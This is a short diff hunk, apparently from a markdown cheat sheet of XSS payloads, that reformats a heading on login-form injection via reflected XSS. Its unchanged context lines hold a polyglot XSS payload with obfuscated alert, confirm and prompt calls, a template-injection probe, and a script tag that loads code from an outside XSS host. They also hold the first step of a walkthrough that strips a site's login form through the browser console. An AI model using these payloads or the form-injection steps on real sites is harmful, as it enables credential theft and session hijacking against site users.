@@ -34,7 +34,9 @@
 '"onclick=(co\u006efirm)?.`0`><sVg/i="${{7*7}}"oNload=" 0>(pro\u006dpt)`1`"></svG/</sTyle/</scripT/</textArea/</iFrame/</noScript/</seLect/--><h1><iMg/srC/onerror=alert`2`>%22%3E%3CSvg/onload=confirm`3`//<Script/src=//ChiragXSS.xSs.ht></scripT>
 ```
 
-#### **How to perform basic Login Form Injection via Reflected XSS**  Step 1: Test vulnerable form for the remove function by running script in console (Dev-Tools)
+#### **How to perform basic Login Form Injection via Reflected XSS**&#x20;
+
+Step 1: Test vulnerable form for the remove function by running script in console (Dev-Tools)
 
 ```
 document.getElementById('urlform').remove();
